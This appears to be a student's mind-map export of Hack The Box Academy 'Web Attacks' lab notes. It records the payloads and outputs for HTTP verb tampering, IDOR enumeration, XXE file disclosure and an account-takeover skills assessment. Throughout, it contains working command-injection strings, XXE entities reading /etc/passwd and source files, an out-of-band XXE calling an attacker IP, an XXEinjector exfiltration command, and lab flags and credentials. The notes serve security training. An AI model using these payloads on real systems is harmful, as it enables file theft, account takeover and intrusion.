---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Web Attacks (can be found in any web application)"
output_topics: 42
---

# Web Attacks (can be found in any web application) — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> Allow: POST,OPTIONS,HEAD,GET
>
> **Source path:** Web Attacks (can be found in any web application) → HTTP verb Tampering → Bypassing Basic Authentication → Exploit → send an OPTIONS request to it and see what HTTP methods are accepted → curl -i -X OPTIONS http://SERVER_IP:PORT/ → Allow: POST,OPTIONS,HEAD,GET
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c471a7f3-692e-47b9-b27a-440d4e8dc170 -->

> [!output]+ 🟨 Output 002
> HTB{4lw4y5_c0v3r_4ll_v3rb5}
>
> **Source path:** Web Attacks (can be found in any web application) → HTTP verb Tampering → Bypassing Basic Authentication → Exploit → HEAD method, which is identical to a GET → but the reset function should still get executed if the restriction was on GET and POST only → Once we change POST to HEAD and forward the request, we will see that we no longer get a login prompt or a 401 Unauthorized → we will see that all files have indeed been deleted successfully → HTB{4lw4y5_c0v3r_4ll_v3rb5}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8df354e2-c4dd-487c-8918-9b900442aa0f -->

> [!output]+ 🟨 Output 003
> Malicious request denied!
>
> **Source path:** Web Attacks (can be found in any web application) → HTTP verb Tampering → Bypassing Security Filters → Identify → if we try to create a new file name with special characters in its name (e.g. test;) → Malicious request denied!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5e0af843-afe1-4b8a-9d7a-8a4574e3944b -->

> [!output]+ 🟨 Output 004
> inded the file was created
> test
>
> **Source path:** Web Attacks (can be found in any web application) → HTTP verb Tampering → Bypassing Security Filters → Exploit → Change HTTP Method → GET /index.php?filename=test%3B → inded the file was created test
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cada739a-4302-4cc1-a885-6ed376e5eac8 -->

> [!output]+ 🟨 Output 005
> test
> file1
> file2
>
> **Source path:** Web Attacks (can be found in any web application) → HTTP verb Tampering → Bypassing Security Filters → Exploit → Change HTTP Method → GET /index.php?filename=test%3B → inded the file was created test → confirm → file1; touch file2; → test file1 file2
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4bb9de81-9191-4c38-8b76-83e6a755cc42 -->

> [!output]+ 🟨 Output 006
> HTB{b3_v3rb_c0n51573n7}
>
> **Source path:** Web Attacks (can be found in any web application) → HTTP verb Tampering → Bypassing Security Filters → LAB → To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./ → file2; cp /flag.txt . → Change request Method from GET to POST → HTB{b3_v3rb_c0n51573n7}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 938b61b0-087d-44c5-8025-cc449d9dfb8c -->

> [!output]+ 🟨 Output 007
> &lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Invoice_3_06_2020.pdf' target='_blank'&gt;Invoice&lt;/a&gt;&lt;/li&gt;
> &lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Report_3_01_2020.pdf' target='_blank'&gt;Report&lt;/a&gt;&lt;/li&gt;
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Mass IDOR Enumeration → Mass Enumeration → inspect and extract → curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "&lt;li class='pure-tree_link'&gt;" → &lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Invoice_3_06_2020.pdf' target='_blank'&gt;Invoice&lt;/a&gt;&lt;/li&gt;  &lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Report_3_01_2020.pdf' target='_blank'&gt;Report&lt;/a&gt;&lt;/li&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a24eb7b7-8431-4b53-bd83-a587146dd86c -->

> [!output]+ 🟨 Output 008
> /documents/Invoice_3_06_2020.pdf
> /documents/Report_3_01_2020.pdf
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Mass IDOR Enumeration → Mass Enumeration → inspect and extract → curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "&lt;li class='pure-tree_link'&gt;" → &lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Invoice_3_06_2020.pdf' target='_blank'&gt;Invoice&lt;/a&gt;&lt;/li&gt;  &lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Report_3_01_2020.pdf' target='_blank'&gt;Report&lt;/a&gt;&lt;/li&gt; → use a Regex → curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf" → /documents/Invoice_3_06_2020.pdf  /documents/Report_3_01_2020.pdf
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 308feb44-c771-4246-b869-30900690cb7a -->

> [!output]+ 🟨 Output 009
> HTB{4ll_f1l35_4r3_m1n3}
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Mass IDOR Enumeration → LAB → Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag. → uid was sent via POST → Fuzz in intruder → uid=15 got the flag → HTB{4ll_f1l35_4r3_m1n3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5ad0cc8d-51d9-4520-8682-7538c3f55713 -->

> [!output]+ 🟨 Output 010
> c4ca4238a0b923820dcc509a6f75849b
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → web applications make hashes or encode their object references → click on the Employment_contract.pdf → POST  contract=cdd96d3cc73d1dbdaffa03cc6cd7339b → try match → using MD5 Manualy → echo -n 1 | md5sum → c4ca4238a0b923820dcc509a6f75849b
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c840f742-a708-4709-b7c0-d618966d931c -->

> [!output]+ 🟨 Output 011
> cdd96d3cc73d1dbdaffa03cc6cd7339b
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → Function Disclosure → if the above hash was being calculated on the front-end → look at the link in the source code → downloadContract() → function downloadContract(uid) {     $.redirect("/download.php", {         contract: CryptoJS.MD5(btoa(uid)).toString(),     }, "POST", "_self"); } → the final value being used in the POST request is the base64 encoded string of 1, which was then md5 hashed. → We can test this by base64 encoding our uid=1, and then hashing it with md5 → echo -n 1 | base64 -w 0 | md5sum → cdd96d3cc73d1dbdaffa03cc6cd7339b
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 77db4df1-7007-4779-aea8-efe656032f36 -->

> [!output]+ 🟨 Output 012
> cdd96d3cc73d1dbdaffa03cc6cd7339b
> 0b7e7dee87b1c3b98e72131173dfbbbf
> 0b24df25fe628797b3a50ae0724d2730
> f7947d50da7a043693a592b4db43b0a1
> 8b9af1f7f76daf0f02bd9c48c4a2e3d0
> 006d1236aee3f92b8322299796ba1989
> b523ff8d1ced96cef9c86492e790c2fb
> d477819d240e7d3dd9499ed8d23e7158
> 3e57e65a34ffcb2e93cb545d024f5bde
> 5d4aace023dc088767b4e08c79415dcd
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → Mass Enumeration → bash script to retrieve all employee contracts. → calculating the hash for each of the first ten employees → for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done → cdd96d3cc73d1dbdaffa03cc6cd7339b  0b7e7dee87b1c3b98e72131173dfbbbf  0b24df25fe628797b3a50ae0724d2730  f7947d50da7a043693a592b4db43b0a1  8b9af1f7f76daf0f02bd9c48c4a2e3d0  006d1236aee3f92b8322299796ba1989  b523ff8d1ced96cef9c86492e790c2fb  d477819d240e7d3dd9499ed8d23e7158  3e57e65a34ffcb2e93cb545d024f5bde  5d4aace023dc088767b4e08c79415dcd
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1afb0b0a-a636-4c37-8073-868f41e23715 -->

> [!output]+ 🟨 Output 013
> contract_006d1236aee3f92b8322299796ba1989.pdf
> contract_0b24df25fe628797b3a50ae0724d2730.pdf
> contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
> contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
> contract_5d4aace023dc088767b4e08c79415dcd.pdf
> contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
> contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
> contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
> contract_d477819d240e7d3dd9499ed8d23e7158.pdf
> contract_f7947d50da7a043693a592b4db43b0a1.pdf
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → Mass Enumeration → bash script to retrieve all employee contracts. → run the script → ls -1 → contract_006d1236aee3f92b8322299796ba1989.pdf  contract_0b24df25fe628797b3a50ae0724d2730.pdf  contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf  contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf  contract_5d4aace023dc088767b4e08c79415dcd.pdf  contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf  contract_b523ff8d1ced96cef9c86492e790c2fb.pdf  contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf  contract_d477819d240e7d3dd9499ed8d23e7158.pdf  contract_f7947d50da7a043693a592b4db43b0a1.pdf
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b4132110-7ad0-4a62-a82e-732e03481cca -->

> [!output]+ 🟨 Output 014
> MQ==
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → LAB → Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly → intercept the request when download contract file → GET /download.php?contract=MQ%3D%3D → decode as URL → MQ==
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0f7d1629-e0e0-47f7-b747-92d1b337b467 -->

> [!output]+ 🟨 Output 015
> 1
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → LAB → Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly → intercept the request when download contract file → GET /download.php?contract=MQ%3D%3D → decode as URL → MQ== → decode base64 → 1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ce2de597-5673-422b-a779-03e434a9de47 -->

> [!output]+ 🟨 Output 016
> HTB{h45h1n6_1d5_w0n7_570p_m3}
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Bypassing Encoded References → LAB → Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly → send to intruder → GET /download.php?contract=$$ → Numbers from 1 to 20 → Payload processing → Encode - base64 → Encode - URL key characters → Start → 20 is a hit → HTB{h45h1n6_1d5_w0n7_570p_m3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f7378649-e485-4bdf-bf6a-6fff822d67ba -->

> [!output]+ 🟨 Output 017
> uid mismatch
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → IDOR in Insecure APIs → Exploiting Insecure APIs → Change our uid to another user's uid, such that we can take over their accounts → e.g. "uid": 2 → uid mismatch
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6bc1fd65-8c72-4ebd-a575-24875a2b80bb -->

> [!output]+ 🟨 Output 018
> uuid mismatch
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → IDOR in Insecure APIs → Exploiting Insecure APIs → Change our uid to another user's uid, such that we can take over their accounts → /profile/api.php/profile/2, and change "uid": 2 → uuid mismatch
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0959b40b-1a55-4954-9151-58d251d05490 -->

> [!output]+ 🟨 Output 019
> Creating new employees is for admins only
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → IDOR in Insecure APIs → Exploiting Insecure APIs → Create new users with arbitrary details, or delete existing users → POST, change the uid to a new uid, and send the request to the API endpoint of the new uid: → Creating new employees is for admins only
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7df14c39-d52a-48b0-9d37-59a45e73cb86 -->

> [!output]+ 🟨 Output 020
> Deleting employees is for admins only
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → IDOR in Insecure APIs → Exploiting Insecure APIs → Create new users with arbitrary details, or delete existing users → Deleting employees is for admins only
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 64862599-d3aa-445e-8f43-3176a368f08d -->

> [!output]+ 🟨 Output 021
> Invalid role
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → IDOR in Insecure APIs → Exploiting Insecure APIs → Change our role to a more privileged role (e.g. admin) to be able to perform more actions → change our role to admin/administrator → Invalid role
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c4582d2d-50bc-4d2d-baa3-7b285afb6095 -->

> [!output]+ 🟨 Output 022
> eb4fe264c10eb7a528b047aa983a4829
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → IDOR in Insecure APIs → LAB → Try to read the details of the user with 'uid=5'. What is their 'uuid' value? → GET /profile/api.php/profile/5 → eb4fe264c10eb7a528b047aa983a4829
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 901155f8-cb7e-4e2e-adea-78ab9956d130 -->

> [!output]+ 🟨 Output 023
> 4a9bd19b3b8676199592a346051f950c
>
> **Source path:** Web Attacks (can be found in any web application) → Insecure Direct Object References (IDOR) → Chaining IDOR Vulnerabilities → Information Disclosure → GET /profile/api.php/profile/2 → we got uuid of user 2 → 4a9bd19b3b8676199592a346051f950c
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 11abb7f6-351d-487e-b6e4-e3d4318eec76 -->

> [!output]+ 🟨 Output 024
> Check your email Inlane Freight for further instructions
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Local File Disclosure → Identifying XXE vulnerabilities → web pages that accept an XML user input in POST → &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;root&gt; ‹name&gt; First &lt;/ name&gt; ‹tel&gt; &lt;/tel&gt; &lt;email&gt; email@xxe.htb &lt;/email&gt; ‹message&gt; Test &lt;/message&gt; &lt;/root&gt; → email element is being displayed back to us on the page. → try to define a new entity and then use it as a variable in the email element → &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE email [ &lt;!ENTITY company "Inlane Freight"&gt; &lt;root&gt; &lt;name&gt; First &lt;/ name&gt; &lt;tel&gt; &lt;/tel&gt; ‹email&gt; &amp;company; &lt;/email&gt; ‹message&gt; Test &lt;/message&gt; → Check your email Inlane Freight for further instructions
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b18532af-c972-4df4-9752-291e8be3cf77 -->

> [!output]+ 🟨 Output 025
> successfully
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Local File Disclosure → Reading Sensitive Files → enables us to → content of the /etc/passwd → &lt;!DOCTYPE email [   &lt;!ENTITY company SYSTEM "file:///etc/passwd"&gt; ]&gt; → &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE email [   &lt;!ENTITY company SYSTEM "file:///etc/passwd"&gt; ]&gt; &lt;root&gt; ‹name&gt; First &lt;/ name&gt; ‹tel&gt; &lt;/tel&gt; ‹email&gt; &amp;company; &lt;/email&gt; ‹message&gt; Test &lt;/message&gt; &lt;/ root&gt; → successfully
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4a678bf1-ca1d-4a68-be9d-dc0fe50e45c9 -->

> [!output]+ 🟨 Output 026
> Check your email for further instructions.
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Local File Disclosure → Reading Source Code → let us see if we can use the same attack to read the source code of the index.php → file://index.php → Check your email for further instructions.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c62b3bc0-7eb4-45c3-80fb-84c30f8c57c3 -->

> [!output]+ 🟨 Output 027
> base64 encoded string of the index.php
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Local File Disclosure → Reading Source Code → let us see if we can use the same attack to read the source code of the index.php → file://index.php → Check your email for further instructions. → PHP provides wrapper filters that allow us to base64 encode → only works with PHP web applications. → &lt;!DOCTYPE email [    &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;  ]&gt; → base64 encoded string of the index.php
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7475ca73-b090-4530-81d1-f97936407514 -->

> [!output]+ 🟨 Output 028
> UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Local File Disclosure → LAB → Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer. → &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE email [   &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"&gt; ]&gt; &lt;root&gt; &lt;name&gt;gg&lt;/name&gt; &lt;tel&gt;1111111111&lt;/tel&gt; &lt;email&gt;&amp;company;&lt;/email&gt; &lt;message&gt;rgdfhf&lt;/message&gt; &lt;/root&gt; → UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6fcd2b4c-9121-47af-9f74-74fa24ae76e3 -->

> [!output]+ 🟨 Output 029
> Check your email A@AR.J for further instructions.
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Advanced File Disclosure → LAB → Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error'). → Inspect the XML sended by POST → &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;root&gt; &lt;name&gt;yg&lt;/name&gt; &lt;tel&gt;1111111&lt;/tel&gt; &lt;email&gt;A@AR.J&lt;/email&gt; &lt;message&gt;mygyjg8ku&lt;/message&gt; &lt;/root&gt; → Check your email A@AR.J for further instructions.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 54c59d52-8647-4da2-835f-f0d003c7bf40 -->

> [!output]+ 🟨 Output 030
> &lt;?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?&gt;
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Advanced File Disclosure → LAB → Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error'). → get the flag → &lt;!DOCTYPE email [   &lt;!ENTITY % begin "&lt;![CDATA["&gt;   &lt;!ENTITY % file SYSTEM "file:///flag.php"&gt;   &lt;!ENTITY % end "\]\]&gt;"&gt;   &lt;!ENTITY % xxe SYSTEM "http://10.10.14.4:8081/xxe.dtd"&gt;   %xxe; ]&gt; &lt;root&gt; &lt;name&gt;yg&lt;/name&gt; &lt;tel&gt;1111111&lt;/tel&gt; &lt;email&gt; &amp;joined;&lt;/email&gt; &lt;message&gt;mygyjg8ku&lt;/message&gt; &lt;/root&gt; → &lt;?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 65c77aa8-1c18-49f0-ba15-8c360c5735a4 -->

> [!output]+ 🟨 Output 031
> root:x:0....
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Blind Data Exfiltration → Automated OOB Exfiltration → run the tool with the --host/--httpport → cat Logs/10.129.201.94/etc/passwd.log → root:x:0....
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 60cc2c5e-06d9-4dc4-96a8-747206af3963 -->

> [!output]+ 🟨 Output 032
> &lt;?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?&gt;
>
> **Source path:** Web Attacks (can be found in any web application) → XXE → Blind Data Exfiltration → LAB → Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag. → Attack → ruby XXEinjector.rb --host=10.10.14.4 --httpport=8000 --file=xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter → cd Logs/ → cat *.log → &lt;?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: de07c92d-dbd0-4c1d-b1a7-9c4ef2939596 -->

> [!output]+ 🟨 Output 033
> {"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → Inestigate all the functions then look at HTTP requests → GET /api.php/user/74 → {"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5f35b98f-06ba-497a-bd1f-2d44c408eddc -->

> [!output]+ 🟨 Output 034
> {"token":"e51a8a14-17ac-11ec-8e67-a3c050fe0c26"}
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → Inestigate all the functions then look at HTTP requests → GET /api.php/token/74 → {"token":"e51a8a14-17ac-11ec-8e67-a3c050fe0c26"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fcf823d9-38bb-4961-8eee-1235526ddba0 -->

> [!output]+ 🟨 Output 035
> {"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → Use Intruder from 1 to 74 → GET /api.php/user/1 → {"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 491344cb-61de-4983-a8e9-d9bb4f40a859 -->

> [!output]+ 🟨 Output 036
> {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → Use Intruder from 1 to 74 → GET /api.php/user/52 → {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8e0cd647-3b3c-4dd0-84b5-d05d853c3518 -->

> [!output]+ 🟨 Output 037
> {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → GET the token for the uid 52 → GET /api.php/token/52 → {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f9e452e8-7ce5-4a83-a16a-0a59688a8a8b -->

> [!output]+ 🟨 Output 038
> Access Denied
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → reset.php function → POST /reset.php Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=74  uid=74&amp;token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&amp;password=123 → Now change uid 52 → POST /reset.php HTTP/1.1 Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52  uid=52&amp;token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&amp;password=123 → Access Denied
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 39ec88f2-d3c6-46bc-82cf-d426d8cb61a8 -->

> [!output]+ 🟨 Output 039
> Password changed successfully
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → reset.php function → POST /reset.php Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=74  uid=74&amp;token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&amp;password=123 → Now change uid 52 → POST /reset.php HTTP/1.1 Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52  uid=52&amp;token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&amp;password=123 → Access Denied → Change request method (from POST to GET) → Password changed successfully
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 76d4c02e-907a-4ed3-96b3-0d8f74ed7c15 -->

> [!output]+ 🟨 Output 040
> Event 'dg' has been created.
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → /addEvent.php → POST /addEvent.php HTTP/1.1 Content-Type: text/plain;charset=UTF-8 Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52              &lt;root&gt;             &lt;name&gt;dg&lt;/name&gt;             &lt;details&gt;dff&lt;/details&gt;             &lt;date&gt;2026-04-25&lt;/date&gt;             &lt;/root&gt; → Event 'dg' has been created.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2d3f7d58-7a6d-4af1-8c83-76c567c47b3a -->

> [!output]+ 🟨 Output 041
> Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → /addEvent.php → POST /addEvent.php HTTP/1.1 Content-Type: text/plain;charset=UTF-8 Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52              &lt;root&gt;             &lt;name&gt;dg&lt;/name&gt;             &lt;details&gt;dff&lt;/details&gt;             &lt;date&gt;2026-04-25&lt;/date&gt;             &lt;/root&gt; → Event 'dg' has been created. → since it reflected we can inject XXE → POST /addEvent.php HTTP/1.1 Cookie: PHPSESSID=hrkke6uu887kofvv26amejjdc7; uid=52  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE root [   &lt;!ENTITY flag SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"&gt; ]&gt; &lt;root&gt;   &lt;name&gt;&amp;flag;&lt;/name&gt;   &lt;details&gt;test_event_detail&lt;/details&gt;   &lt;date&gt;&lt;/date&gt; &lt;/root&gt; → Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 269a8f11-f808-40f3-b72c-75976bda1e69 -->

> [!output]+ 🟨 Output 042
> &lt;?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?&gt;
>
> **Source path:** Web Attacks (can be found in any web application) → Skills Assessment → Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' htb-student:Academy_student! → /addEvent.php → POST /addEvent.php HTTP/1.1 Content-Type: text/plain;charset=UTF-8 Cookie: PHPSESSID=nfgc70lqb12j810mg4936embhl; uid=52              &lt;root&gt;             &lt;name&gt;dg&lt;/name&gt;             &lt;details&gt;dff&lt;/details&gt;             &lt;date&gt;2026-04-25&lt;/date&gt;             &lt;/root&gt; → Event 'dg' has been created. → since it reflected we can inject XXE → POST /addEvent.php HTTP/1.1 Cookie: PHPSESSID=hrkke6uu887kofvv26amejjdc7; uid=52  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE root [   &lt;!ENTITY flag SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"&gt; ]&gt; &lt;root&gt;   &lt;name&gt;&amp;flag;&lt;/name&gt;   &lt;details&gt;test_event_detail&lt;/details&gt;   &lt;date&gt;&lt;/date&gt; &lt;/root&gt; → Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created. → decode base64 → &lt;?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f0e8ba17-7106-44b6-9dcb-b56c1678c73a -->
